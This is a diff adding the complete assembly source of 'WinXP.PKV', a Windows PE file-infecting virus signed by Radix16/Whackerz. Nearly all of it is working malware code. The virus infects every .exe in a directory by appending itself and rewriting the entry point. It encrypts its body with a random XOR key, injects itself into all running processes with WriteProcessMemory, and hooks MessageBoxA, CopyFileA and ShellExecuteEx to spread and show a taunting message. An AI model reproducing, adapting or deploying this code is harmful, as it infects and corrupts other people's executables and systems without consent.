@@ -1,0 +1,1080 @@
+
+; Whackerz #1
+; WinXP.PKV by Radix16/Whackerz
+
+
+
+; Made in Czech republic
+; 
+; TARGET : EXE(PE)
+; API HOOK: MessageBoxA, CopyFileA, ShellExecuteEx in all process
+;
+;
+; PAYLOAD REPLACE MESSAGE BOX  
+; ---------------------------
+;		------------------------------------
+;		|PKV by Radix16/ELEMENT            |
+;               |----------------------------------| 
+;		|I am sorry: MessageBox is my..haha|			
+;		|		                   | 
+;		|	       OK		   |
+;		------------------------------------
+;
+;       kernel32.MessageBoxA:        
+;	     XXXXXXXX JMP virus_newmessagebox	
+;			.			
+;			.
+;			.
+;			.
+;		virus.newmessagebox:	
+;         		XXXXXXXX [esp + 16],XXX ; uType 
+;         		XXXXXXXX [esp + 12],XXX ; Caption
+;         		XXXXXXXX [esp + 8],XXX	; Text
+;         		XXXXXXXX [esp + 4],XXX  ; hWnd
+;			.
+;			XXXXXXXX JMP old_messagebox
+;					.
+;					.
+;					.
+;			old_messagebox: push	00000000h
+;					push	dword ptr [esp + 14h]
+;					push	dword ptr [esp + 14h]
+;					push	dword ptr [esp + 14h]
+;					push	dword ptr [esp + 14h]
+;					JMP	MessageBoxEx
+;			
+;
+; ShellExecuteEx RULE
+; -------------------
+; [EXECUTE] > Infection all files in the directory and return original Shell...
+; I testing in WindowsCommander. 
+;  
+;
+; contact me
+; ----------
+; radix16.cjb.net
+; radix16@altas.cz
+;
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/ 
+.386p
+locals
+jumps
+.model flat
+
+extrn           GetModuleHandleA        :proc
+extrn           ExitProcess             :proc
+extrn           MessageBoxA             :proc
+
+vsize           equ     end_virus - start + 1500
+max_path        equ     0FFh
+
+COPY_MARK	equ	0ABC123h
+
+include 	Useful.inc
+include 	Win32API.inc
+include 	MZ.inc
+include 	PE.inc
+
+S MACRO 
+ 	db      ( vsize ) / 01000 mod 10 + "0"
+        db      ( vsize ) / 00100 mod 10 + "0"
+        db      ( vsize ) / 00010 mod 10 + "0"
+        db      ( vsize ) / 00001 mod 10 + "0"
+ENDM
+.data
+	db 'PKV size ='
+	S
+.code
+start:		jmp	real_start
+xxx__000: 	pushad
+
+		@SEH_SetupFrame	
+		push	eax
+
+		mov	ebx,eax
+		mov	ecx,255 
+
+if_exe:		cmp	[eax],06578652Eh			; .exe
+		je	n_xe__
+		inc	eax					; +
+		loop	if_exe
+
+		jmp	back_host
+
+n_xe__: 	xor	dl,dl
+		cmp	byte ptr [eax + 4],dl			; last 0?
+		jne	back_host
+
+		xor	edx,edx
+
+se_tg:		cmp	byte ptr [eax],'\'
+		je	put_z
+
+		cmp	eax,ebx
+		je	no_dr
+
+		dec	eax
+		loop	se_tg
+
+put_z:		mov	byte ptr [eax],dl
+		mov	edx,eax
+
+no_dr:		pop	eax
+
+		mov     esi,077E60000h 				; XP kernel32
+		mov	edi,COPY_MARK
+
+		jmp	xxx__001
+start_x:
+		pushad
+
+		@SEH_SetupFrame	
+		mov     esi,077E60000h
+		jmp	xxx__001
+real_start:
+        	push    offset first_generation                 ; old entery point RVA
+	oldeip  equ     $ - 4                       
+		pushad                                          ; save all reg.
+        	mov     esi,[esp+24h]                       	; get kernel base address
+
+        	@SEH_SetupFrame	
+xxx__001:	call    delta                      
+delta:  	pop     ebp                                     ; get
+        	sub     ebp,offset delta                        ; delta address
+
+		cmp	edi,COPY_MARK
+		jne	encrypt
+
+		mov	[ebp + set_tg_x],edx
+		mov	[ebp + address_file],eax		; save pointer to file	
+encrypt:	mov	edx,00000000h				; encrypt key
+	enc_key = dword ptr $ - 4	
+		mov	ecx,(crypt_end - crypt_start) / 4	; size to encrypt
+		lea	eax,[ebp + crypt_start]			; pointer to start encr.
+encr_l:		xor	[eax],edx
+		add	eax,4
+
+		loop	encr_l
+
+	crypt_start	equ	$
+		mov     ecx,100                                 ;
+		xchg	esi,eax
+        	and     eax,0ffff0000h                          ; ax = null
+
+c_MZ:   	cmp     word ptr [eax],'ZM'                     ; test MZ
+        	je      c_PE                                   
+
+n_P:    	sub     eax,1000h                               ; - page
+        	dec     ecx                                    
+        	jnz     c_MZ                                   
+
+        	jmp     back_host                               ; not found end v.
+c_PE:   	mov     ebx,eax                                
+        	add     eax,[eax + 3ch]                         ; PE header
+        	cmp     dword ptr [eax],'EP'                    ; test PE
+        	jnz     n_P                                    
+		
+		cmp	ebx,077E60000h
+		jne	back_host
+
+       	 	mov     dword ptr [ebp + kernel32],ebx          ; save Kerne32 base addr
+		
+        	xor     eax,eax
+        	mov     dword ptr [ebp + dd_api_s],eax
+        	mov     dword ptr [ebp + set_api],eax
+
+d_scan_loop:
+       		call    decompress_API                          ; decompress API fce
+        	or      esi,esi                                
+        	je      API_complete                           
+
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; SCAN API
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+
+        	mov     edx,dword ptr [ebp + kernel32]          ; edx < kernel base address
+        	mov     ebx,edx                                 
+        	add     ebx,[ebx + 3ch]                         
+        	mov     ebx,[ebx + 78h]				; export section                         
+        	add     ebx,edx                                 
+        	mov     edi,[ebx + 20h]				; addres of names                         
+        	lea     edi,[edi + edx - 4]
+
+        	push    esi
+        	push    edi
+
+next_name:     	mov     esi,[esp + 4]                                   
+        	mov     edi,[esp]                                       
+        	add     edi,4                                           
+        	mov     [esp],edi                                       
+        	mov     edi,[edi]                               
+        	add     edi,edx                          
+
+api_loop: 	lodsb                                           ; ESI > al
+        	cmp     al,[edi]                                        
+        	jne     next_name                                       
+        	inc     edi                                             
+        	or      al,al                                           
+        	je      api_found                                 ; found ?      
+        	jmp     api_loop                                          
+
+api_found:                                                      
+        	pop     edi                                             
+        	pop     esi                                             
+                                                                
+        	sub     edi,[ebx + 20h]                                 
+        	sub     edi,edx                                         
+        	mov     eax,[ebx + 1ch]				; addres of function                                 
+        	add     eax,edx                                         
+        	mov     ecx,[ebx + 14h]                                 
+        	sub     ecx,[ebx + 18h]                         ; number of names        
+        	lea     eax,[eax + 4 * ecx]                             
+
+        	add     eax,edi                                         
+        	mov     eax,[eax]                               ; create full offset        
+        	add     eax,edx                                 ; to api function        
+
+        	mov     edx,00000000h                                   
+dd_api_s equ    $ - 4                                           
+        	mov     dword ptr [ebp + dd_apis + edx],eax     ; save        
+        	jmp     d_scan_loop                                     
+API_complete:
+		call	[ebp + ddGetVersion]			; get version
+		cmp	al,5					; 2K or XP
+		jne	back_host
+
+		call	memory_spider				; Hack API
+
+		mov	ebx,[ebp + address_file]
+		or	ebx,ebx
+		je	if_cpx
+
+		mov	eax,[ebp + set_tg_x]
+		or	eax,eax
+		je	cp_nan		
+
+		lea	eax,[ebp + dir_buf]
+		push	eax
+		push	256	
+		call	[ebp + ddGetCurrentDirectoryA]
+
+		push	ebx
+		call	[ebp + ddSetCurrentDirectoryA]
+
+		mov	ebx,[ebp + set_tg_x]
+		inc	ebx
+		jmp	cp_nan
+; infect in current directory				; yea go!
+if_cpx:		lea	ebx,[ebp + exe_file]
+
+cp_nan:		lea     eax,[ebp + search]
+        	push    eax
+		push	ebx
+        	call    [ebp + ddFindFirstFileA]		; search *.exe
+        	inc     eax                                             
+        	je      next_vej                                 ; found file?
+        	dec     eax                                             
+	
+        	call    infect_exe                              ; infect rule
+next_vej:
+		xor	eax,eax
+		mov	dword ptr [ebp + enc_key],eax 
+back_host:
+		mov	ebx,[ebp + set_tg_x]
+		or	ebx,ebx
+		je	no_setting
+		mov	byte ptr [ebx],'\'
+		xor	eax,eax
+		mov	[ebp + set_tg_x],eax
+		mov	[ebp + address_file],eax
+
+		lea	eax,[ebp + dir_buf]
+		push	eax
+		call	[ebp + ddSetCurrentDirectoryA]
+no_setting:
+		@SEH_RemoveFrame
+        	popad                                           
+        	ret                                             ; back to host
+
+address_file	dd 	00000000h			; directory	
+set_tg_x	dd	00000000h			; + 1 = filename
+exe_file	db 	'*.exe',0
+
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; DECOMPRESS API
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+decompress_API:                                         ; decompress API names
+        	mov     esi,00000000h                                   
+	set_api	equ     $ - 4				                                           
+       	 	or      esi,esi                                         
+       	 	jne     api_d_8n                                        
+	
+        	call    api_compress                            
+       		db      1, 'First', 2, 'A', 0                   ; FindFirstFileA
+        	db      1, 'Next', 2, 'A', 0                    ; FindNextFileA
+        	db      1, 3, 0                                 ; FindClose
+        	db      4, 2, 'A', 0                            ; CreateFileA
+        	db      4, 2, 'Mapping', 'A', 0                 ; CreateFileMappingA
+        	db      'Map', 5, 'Of', 2, 0                    ; MapViewOfFile
+        	db      'Unmap', 5,'Of', 2, 0                   ; UnmapViewOfFile
+        	db      3, 'Handle', 0                          ; CloseHandle
+		db	6, 'Version', 0				; GetVersion
+		db	7 ,10 , 0				; OpenProcess
+		db	'Virtual', 9, 'Ex', 0			; VirtualAllocEx
+		db	8, 10, 'Memory', 0			; WriteProcessMemory
+		db	'Read', 10, 'Memory',0			; ReadProcessMemory
+		db	6, 'ProcAddress', 0			; GetProcAddress
+		db	'LoadLibraryA', 0			; 
+		db	'FreeLibrary',0
+		db	6, 'CurrentDirectoryA',0		; GetCurrentDirectoryA	
+		db	'SetCurrentDirectoryA',0		; SetCurrentDirectoryA
+        	db      0AAh
+name_table:
+        	db      'Find'                                  ; 1
+        	db      'File'                                  ; 2
+        	db      'Close'                                 ; 3
+        	db      'Create'                                ; 4
+        	db      'View'                                  ; 5
+		db	'Get'					; 6
+		db	'Open'					; 7
+		db	'Write'					; 8
+		db	'Alloc'					; 9
+		db	'Process'				; 11	
+
+s_table =       $ - name_table                                  
+api_compress:                                                   
+        	pop     esi                                             
+api_d_8n:                                                       
+        	lea     edi,[ebp + decompress_b]                ; buffer        
+        	push    edi
+api_d_loop: 	lodsb                                               
+        	cmp     al,1					; 1 = Find
+        	jne     _nex_t                                          
+        	mov     eax,dword ptr [ebp + name_table]                
+        	stosd                                                   
+        	jmp     api_d_loop                                      
+_nex_t: 	cmp     al,2                  			; 2 = File
+        	jne     _nex_t2                                         
+        	mov     eax,dword ptr [ebp + name_table + 4]            
+        	stosd                                                   
+        	jmp     api_d_loop                                      
+_nex_t2:	cmp     al,3         				; 3 = Close
+        	jne     _nex_t3                                         
+        	mov     eax,dword ptr [ebp + name_table + 8]            
+        	stosd                                                   
+        	mov     al,byte ptr [ebp + name_table + 12]             
+        	stosb                                                   
+        	jmp     api_d_loop                                      
+_nex_t3:	cmp     al,4                                    ; 4 = Create        
+        	jne     _nex_t4                                         
+        	mov     eax,dword ptr [ebp + name_table + 13]           
+        	stosd                                                   
+        	mov     ax,word ptr [ebp + name_table + 17]             
+        	stosw                                                   
+        	jmp     api_d_loop                                      
+_nex_t4:	cmp     al,5 					; 5 = View                                           
+        	jne     _nex_t5                                         
+        	mov     eax,dword ptr [ebp + name_table + 19]           
+        	stosd                                                   
+        	jmp     api_d_loop                                      
+_nex_t5:	cmp     al,6                                    ; 6 = Get        
+        	jne     _nex_t6
+        	mov     ax,word ptr [ebp + name_table + 23]             
+        	stosw                                                   
+        	mov     al,byte ptr [ebp + name_table + 25]             
+        	stosb                                                   
+        	jmp     api_d_loop                                      
+_nex_t6:	cmp     al,7                                    ; 7 = Open
+        	jne     _nex_t7
+        	mov     eax,dword ptr [ebp + name_table + 26]           
+        	stosd                                                   
+        	jmp     api_d_loop                                      
+_nex_t7:	cmp     al,8                                    ; 8 = Write        
+        	jne     _nex_t8
+        	mov     eax,dword ptr [ebp + name_table + 30]           
+        	stosd                                                   
+        	mov     al,byte ptr [ebp + name_table + 34]             
+        	stosb                                                   
+        	jmp     api_d_loop                                      
+_nex_t8:	cmp     al,9                                    ; 9 = Alloc        
+        	jne     _nex_t9
+        	mov     eax,dword ptr [ebp + name_table + 35]           
+        	stosd                                                   
+        	mov     al,byte ptr [ebp + name_table + 39]             
+        	stosb                                                   
+        	jmp     api_d_loop                                      
+_nex_t9:	cmp     al,10                                   ; 10 = Process        
+        	jne     _nex_t10
+        	mov     eax,dword ptr [ebp + name_table + 40]           
+        	stosd                                                   
+        	mov     eax,dword ptr [ebp + name_table + 44]             
+        	stosd                                                   
+		dec	edi
+        	jmp     api_d_loop                                      
+_nex_t10:	stosb                                                   
+        	or      al,al                                   ; name is complete ?        
+        	je      get_apix                                ; end ?        
+        	cmp     al,0AAh                                         
+        	je      api_ok                                          
+        	jmp     api_d_loop                                      
+get_apix:	pop     edi                                            
+        	mov     dword ptr [ebp + set_api], esi                  
+        	mov     esi,edi                                         
+        	add     dword ptr [ebp + dd_api_s],4            ; add api stuff        
+        	ret                                                     
+api_ok: 	pop     edi                                             
+        	xor     esi,esi                                 ; esi = 0 > success        
+        	ret                                                     
+
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; INFECT PE filez
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+infect_exe  proc
+        	pushad                                          ; save all reg.
+        	mov     dword ptr [ebp + s_handle],eax          ; save search handle
+i_nfile:
+		mov	eax,1235678h
+		mov	dword ptr [ebp + set_rd_],eax
+		mov	dword ptr [ebp + flash_flag],eax
+
+        	lea     edi,[ebp + search.FileName]             ; get file name
+
+        	xor     eax,eax
+        	push    eax
+        	push    FILE_ATTRIBUTE_NORMAL
+        	push    OPEN_EXISTING
+        	push    eax
+        	push    1
+        	push    80000000h or 40000000h			; R/W
+        	push    edi					; filename
+        	call    [ebp + ddCreateFileA]			; OPEN FILE	
+		inc     eax                                             
+        	je      n_inf                                   ; opened ?
+        	dec     eax                                             
+        	xchg    eax,ebx                                         
+
+        	xor     eax,eax					; eax=0
+        	push    eax					; 0
+        	push    eax					; 0
+        	push    eax					; 0
+        	push    PAGE_READONLY
+        	push    eax
+        	push    ebx
+        	call    [ebp + ddCreateFileMappingA]		; Mapping
+        	or      eax,eax                                 ; ok ?
+        	je      c_handle_
+
+        	mov     dword ptr [ebp + map_h_],eax            ; save map handle
+
+        	xor     edx,edx					; edx=0
+		push	edx					; ...
+        	push    edx
+        	push    edx
+        	push    FILE_MAP_READ
+        	push    eax					; handle of map handle
+        	call    [ebp + ddMapViewOfFile]			; Map View
+        	or      eax,eax                                 ; ok ?
+        	je      c_map_
+	
+        	mov     dword ptr [ebp + m_adr_],eax            ; save map address
+
+		mov	edi,eax
+								; CHECK FILE
+		mov	edx,[ebp + search.FileSizeLow]
+		cmp	word ptr [edi],IMAGE_DOS_SIGNATURE
+		jne     un_map_					; MZ? 
+		mov	edx,[edi+3ch]				; IT'S BUG!!!
+		cmp	edi,edx					; out range ?
+		jb	un_map_			
+		add	edi,edx
+		cmp	dword ptr [edi],IMAGE_NT_SIGNATURE 	;P/E/0/0
+		jne	un_map_
+		cmp     word ptr [edi.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386	
+		jne     un_map_
+		cmp	dword ptr [edi + 12],not '-XdR'		; test infect flag
+		je	un_map_
+        	mov     edx,dword ptr [edi.NT_FileHeader.FH_Characteristics]
+        	not     dl
+        	test    dl,IMAGE_FILE_EXECUTABLE_IMAGE  	; executeble ?
+		jnz     un_map_
+        	test    dh,IMAGE_FILE_DLL shr 8        		; dll ?
+        	jnz     un_map_
+		mov     ecx,[ebp + search.FileSizeLow]		; ecx = filesize
+		sub	ecx,3					; ecx - 3
+		push	ecx					; save ecx 
+		push	eax					; sava eax
+test_flash:						
+		cmp	word ptr [eax],'lf'			; test flash
+		jne	next_loo				; filez
+		cmp	word ptr [eax + 2],'sa'
+		je	flash_found
+next_loo:
+		inc	eax					; +
+		loop	test_flash				
+		jmp	no_flash				
+flash_found:
+		xor	eax,eax
+		mov	dword ptr [ebp + flash_flag],eax	; flah file set flag!
+no_flash:					
+		pop	eax					; return reg.
+		pop	ecx
+test_net:			
+		cmp	dword ptr [eax],'ocsm'			; test mscorlib	
+		jne	next_nt					;
+		cmp	dword ptr [eax + 4],'bilr'
+		je	un_map_
+next_nt:
+		inc	eax	
+		loop	test_net
+
+		mov	edi,0FFh				; all is ok!
+un_map_:	
+ 		push    12345678h				; close rule
+	m_adr_  equ     $ - 4
+        	call    [ebp + ddUnmapViewOfFile]		
+c_map_:
+        	push    12345678h				; ...
+	map_h_  equ     $ - 4
+        	call    [ebp + ddCloseHandle]
+c_handle_:
+       	 	push   ebx
+        	call    [ebp + ddCloseHandle]			; ...
+
+		cmp	edi,0FFh				
+		jne	n_inf
+INFECT_REAL:
+        	lea     edi,[ebp + search.FileName]		;
+
+        	xor     eax,eax
+        	push    eax
+        	push    eax
+        	add     eax,3
+        	push    eax
+        	sub     eax,eax
+        	push    eax
+        	inc     eax
+        	push    eax
+        	push    80000000h or 40000000h
+        	push    edi					; open filez
+        	call    [ebp + ddCreateFileA]
+        	inc     eax
+ 	       	je      n_inf
+        	dec     eax
+	        xchg    eax,ebx
+
+		mov	dword ptr [ebp + file_h],ebx
+
+	        mov     ecx,[ebp + search.FileSizeLow]
+		mov	eax,12345678h
+	flash_flag = dword ptr $ - 4				; flash file ?	
+		or	eax,eax
+		je	flash_file 
+        	add     ecx,vsize + 1000
+flash_file:	
+        	mov     dword ptr [ebp + n_size_],ecx
+
+        	xor     eax,eax
+        	push    eax
+        	push    ecx
+        	push    eax
+        	push    PAGE_READWRITE
+        	push    eax
+        	push    ebx
+        	call    [ebp + ddCreateFileMappingA]
+        	or      eax,eax                                 ; ok ?
+       	 	je      c_handle
+
+	        mov     dword ptr [ebp + map_h],eax             ; save map handle
+
+        	xor     edx,edx
+        	push    12345678h
+	n_size_ = dword ptr  $ - 4
+        	push    edx
+        	push    edx
+        	push    FILE_MAP_ALL_ACCESS
+        	push    eax
+        	call    [ebp + ddMapViewOfFile]
+        	or      eax,eax                                 ; ok ?
+        	je      c_map
+
+        	mov     dword ptr [ebp + m_adr],eax             ; save map address
+
+		xchg	eax,edi
+		mov	ebx,edi
+
+		add	edi,[edi+3ch]
+		mov	dword ptr [edi + 12],not '-XdR'
+							; Save original RVA 
+		mov	eax,[edi.NT_OptionalHeader.OH_AddressOfEntryPoint]
+		add	eax,[edi.NT_OptionalHeader.OH_ImageBase]
+		mov	dword ptr [ebp + oldeip],eax	
+							; number of section ?
+		movzx   ecx,word ptr [edi.NT_FileHeader.FH_NumberOfSections]
+							; size of PE header
+		movzx   edx,word ptr [edi.NT_FileHeader.FH_SizeOfOptionalHeader]
+		push	edx
+		xor	eax,eax
+		mov	al,IMAGE_SIZEOF_SECTION_HEADER		
+		mul	ecx
+		pop	edx
+		add	edx,eax
+		add	edx,edi
+		sub	edx,16
+							; edx = last section
+		cmp	byte ptr [edx],'.'			; is it ok?
+		jne	un_map
+							; calculate pointer
+		mov	ecx,[edx.SH_SizeOfRawData]
+		mov     eax,[edx.SH_VirtualSize]
+		cmp	ecx,eax
+		jnc	ok_
+		xor	esi,esi
+		mov	[ebp + set_rd_],esi
+		xchg	eax,ecx
+ok_:		add	eax,[edx.SH_PointerToRawData]
+		add	eax,ebx					; ebx = map file address
+		push	edx
+		push	edi	; save map		
+
+		call	save_virus
+
+		pop	edi	; back
+		pop	edx
+
+		or      dword ptr [edx + 24h],0A0000000h
+
+		mov	eax,12345678h
+set_rd_ = dword ptr $ - 4	
+		or	eax,eax
+		jne	set_or
+
+		mov	eax,[edx.SH_SizeOfRawData]
+		add	eax,[edx.SH_VirtualAddress]
+
+		jmp	set_rd
+							; calculate virus entery poin	
+set_or:
+		mov	eax,[edx.SH_VirtualSize]
+		add	eax,[edx.SH_VirtualAddress]	
+							; save new RVA
+set_rd:
+		mov 	[edi.NT_OptionalHeader.OH_AddressOfEntryPoint],eax
+		xor	eax,eax
+; new size
+		mov	ecx,[ebp + set_rd_]
+		or	ecx,ecx
+		jne	next_inf
+		mov	eax,300	
+next_inf:	
+		xchg	edx,ebx
+
+		add	eax,[ebx.SH_SizeOfRawData]
+		add	eax,vsize				; add size to RawData
+		mov	ecx,[edi.NT_OptionalHeader.OH_FileAlignment]
+		cdq						; File Align
+		div	ecx					; divige
+		mul	ecx
+		mov	[ebx.SH_SizeOfRawData],eax		; save new size
+		mov	ecx,[edi.NT_OptionalHeader.OH_SectionAlignment]
+							; Object Align
+		mov	eax,[edi.NT_OptionalHeader.OH_SizeOfImage]
+		add	eax,vsize				; add size to Size of Image
+		cdq
+		div	ecx					; divige
+		mul	ecx
+		mov	[edi.NT_OptionalHeader.OH_SizeOfImage],eax
+							; set new size
+un_map: 	push    12345678h
+	m_adr   equ     $ - 4					; close rule
+        	call    [ebp + ddUnmapViewOfFile]
+c_map:  	push    12345678h
+	map_h   equ     $ - 4
+        	call    [ebp + ddCloseHandle]
+c_handle:	push   12345678h
+	file_h 	equ     $ - 4
+        	call    [ebp + ddCloseHandle]
+n_inf:  	lea     eax,[ebp + search]
+        	push    eax
+        	push    12345678h				; ...
+	s_handle equ    $ - 4
+        	call    [ebp + ddFindNextFileA]			; search next file
+
+        	dec     eax
+        	je      i_nfile					; found ?
+
+        	push    dword ptr [ebp + s_handle]		; no, close search
+        	call    [ebp + ddFindClose]			; handle
+end_inf:
+        	popad
+        	ret
+endp
+;---------------------------------------------------------------
+; Generate random number
+;---------------------------------------------------------------
+_random:pushad
+		push	edx
+		dw 	310Fh					; RDTSC
+		pop	edx
+		mov	dword ptr [ebp + enc_key],eax		; save new d/e key
+		popad
+		ret
+
+; MEMORY SPIDER
+memory_spider proc
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; HACK API!!!
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+
+			PROCESS_VM_OPERATION	=	08h
+			PROCESS_VM_READ		=	10h
+			PROCESS_VM_WRITE	=	20h	
+		pushad
+
+		@pushsz 'SHELL32.DLL'
+		call	[ebp + ddLoadLibraryA]
+		or	eax,eax
+		je	err_lod
+
+		@pushsz 'ShellExecuteEx'
+		push	eax
+		call	[ebp + ddGetProcAddress]
+		or	eax,eax
+		je	err_lod
+		mov	[ebp + o_ShellExecuteEx],eax
+
+		add	eax,8
+		mov	dword ptr [ebp + jmm_shellexe],eax
+
+		@pushsz 'USER32.DLL'
+		call	[ebp + ddLoadLibraryA]
+		or 	eax,eax
+		je	err_lod
+		xchg	eax,ebx		
+
+		@pushsz 'MessageBoxA'				; Get MessageBoxA
+		push	ebx
+		call	[ebp + ddGetProcAddress]
+		or	eax,eax
+		je	err_pr
+		mov	[ebp + o_MessageBoxA],eax		; save
+
+		@pushsz 'MessageBoxExA'
+		push	ebx
+		call	[ebp + ddGetProcAddress]
+		or	eax,eax
+		je	err_pr
+
+		mov	dword ptr [ebp + jmm_msgEXA],eax
+
+		@pushsz 'CopyFileA'
+		push	[ebp + kernel32]
+		call	[ebp + ddGetProcAddress]
+		or	eax,eax
+		je	err_pr
+		mov	[ebp + o_CopyFileA],eax
+
+		add	eax,5
+		mov	dword ptr [ebp + jmm_copf],eax
+
+		xor	eax,eax
+		mov	ecx,4000h
+
+loop_process:
+		inc	eax						
+		push	eax
+		push	ecx	
+
+		push	eax
+		push	0
+		push	PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION 
+		call	[ebp + ddOpenProcess]			; Open Process
+		test	eax,eax
+		je	next___
+		xchg	eax,esi
+
+		lea	eax,[ebp + tmp]
+		push	eax
+		push	4
+		lea	eax,[ebp + cmp_res]
+		push	eax
+		push	[ebp + o_ShellExecuteEx]
+		push	esi
+		call	[ebp + ddReadProcessMemory]
+
+		or	eax,eax
+		je	next___
+
+		cmp	byte ptr [ebp + cmp_res],0E9h
+		je	next___				
+
+		call	go__
+
+next___:	pop	ecx
+		pop	eax
+		loop	loop_process	
+		popad
+		ret
+
+go__:		pushad
+		push	PAGE_EXECUTE_READWRITE			; allocate memory in
+		push	MEM_RESERVE or MEM_COMMIT		; process for virus
+		push	vsize
+		push	0
+		push	esi
+		call	[ebp + ddVirtualAllocEx]
+		test	eax,eax					; ok ?
+		je	err_pr
+		mov	dword ptr [ebp + v_base],eax
+
+		mov	ecx,vsize
+		lea	eax,[ebp + start]
+		mov	edx,dword ptr [ebp + v_base]
+		call	write_process				; write virus to allocate
+		dec	eax
+		jne	err_pr
+
+		mov	eax,dword ptr [ebp + v_base] 		; calculate new jmp
+		mov	ecx,New_MessageBoxA - start
+		add	eax,ecx
+		sub	eax,[ebp + o_MessageBoxA]	
+		sub	eax,5	
+		mov	[ebp + jmp_m],eax			; new jump
+							; memory in process
+		mov	ecx,5
+		lea	eax,[ebp + n_message_jmp]	
+		mov	edx,dword ptr [ebp + o_MessageBoxA]
+		call	write_process				
+		dec	eax
+		jne	err_pr
+
+		mov	edx,0
+	v_base	=	dword ptr $ - 4 
+
+		mov	eax,edx					; calculate new jmp
+		mov	ecx,New_CopyFileA - start
+		add	eax,ecx
+		sub	eax,[ebp + o_CopyFileA]	
+		sub	eax,5	
+		mov	[ebp + jmp_c],eax			; new jump
+
+		mov	ecx,5
+		lea	eax,[ebp + n_copyfile_jmp]
+		mov	edx,[ebp + o_CopyFileA]
+		call	write_process				; new CopyFile
+		dec	eax
+		jne	err_pr
+
+		mov	eax,dword ptr [ebp + v_base]		; calculate new jmp
+		mov	ecx,New_execute - start
+		add	eax,ecx
+		sub	eax,[ebp + o_ShellExecuteEx]
+		sub	eax,5	
+		mov	[ebp + jmp_x],eax			; new jump
+
+		mov	ecx,5
+		mov	edx,[ebp + o_ShellExecuteEx]
+		lea	eax,[ebp + n_six_jmp]
+		call	write_process				; ExitProcess
+		dec	eax
+		jne	err_pr
+err_pr:
+		push	ebx
+		call	[ebp + ddFreeLibrary]
+err_lod:
+		popad
+		ret
+endp
+write_process:
+		push	0
+		push	ecx					; size 
+		push	eax					; start address
+		push	edx					; > to
+		push	esi					; handle of process
+		call	[ebp + ddWriteProcessMemory]
+		ret
+		nop	
+		nop
+crypt_end equ $
+
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; NEW MESSAGE BOX!
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+	New_MessageBoxA:
+		xor	edx,edx
+		mov	[esp + 16],edx
+		call	msg_top
+			db 'PKV by Radix16/ELEMENT',0
+	msg_top:pop	eax
+		mov	[esp + 12],eax
+		call	msg_txt
+			db 'I am sorry: MessageBox is my..haha',0
+	msg_txt:pop	eax
+		mov	[esp + 8],eax
+		mov	[esp + 4],edx
+		call	old_messagebox
+		ret 	010h
+	n_message_jmp:	
+		db	0E9H
+	jmp_m	dd	00000000
+	old_messagebox:
+			push	00000000h
+			push	dword ptr [esp + 14h]
+			push	dword ptr [esp + 14h]
+			push	dword ptr [esp + 14h]
+			push	dword ptr [esp + 14h]
+			mov	eax,12345678h
+	jmm_msgEXA	=	$ - 4
+			jmp	eax
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; NEW COPYFILEA
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+	New_CopyFileA:
+		mov	eax,[esp + 4]
+		call	xxx__000
+		jmp	old_copyfilea
+	n_copyfile_jmp:
+		db	0E9H
+	jmp_c	dd	00000000
+	old_copyfilea:
+			push 	ebp
+			mov	ebp,esp
+			push	ecx
+			push	ecx
+			mov	eax,12345678h
+	jmm_copf	=	$ - 4
+			jmp	eax
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; NEW SHELLEXECUTEEXW
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+	New_execute:
+	
+		call	start_x
+		jmp 	old_ShellExecuteEx
+
+	n_six_jmp:	
+		db	0E9H
+	jmp_x	dd	00000000
+
+	old_ShellExecuteEx:
+			push	ebp
+			mov	ebp,esp
+			mov	eax,00001088	
+			mov	ecx,12345678h
+	jmm_shellexe	=	$ - 4
+			jmp	ecx
+
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; SAVE AND ENCRYPT/DECRYPT STUFF
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+save_virus:
+		pushad
+		call	_random
+		call	crypt_
+
+		lea	esi,[ebp + start]
+		mov	ecx,(vsize - 1000)  / 4			; copy virus to host
+		mov	edi,eax
+		mov	ebx,edi
+		rep	movsd
+
+		call	crypt_
+		popad
+		ret
+
+crypt_:		push	eax
+		push	edx
+	
+		mov	edx,[ebp + enc_key]			; decrypt/encrypt key
+		mov	ecx,(crypt_end - crypt_start) / 4
+		lea	eax,[ebp + crypt_start]
+encr_loop_r:
+		xor	[eax],edx
+		add	eax,4
+		loop	encr_loop_r
+
+		pop	edx
+		pop	eax	
+		ret
+	
+		nop
+		nop
+end_virus:
